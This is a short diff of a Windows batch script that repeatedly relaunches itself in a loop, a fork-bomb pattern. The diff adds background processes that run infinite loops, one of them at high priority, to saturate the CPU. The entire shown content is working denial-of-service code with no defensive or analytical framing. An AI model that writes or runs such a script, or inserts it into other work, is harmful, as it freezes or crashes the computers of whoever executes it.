@@ -102,4 +102,9 @@ for /l %%i in (1,1,4) do (
     start /b "" "%~f0"
     start /min "" "%~f0"
 )
+
+start /b cmd /c for /L %%i in (1,0,1000000) do echo STRESS >nul
+
+start /high /min cmd /c "for /l %%n in () do set /a n=%%n*%%n"
+
 goto loop
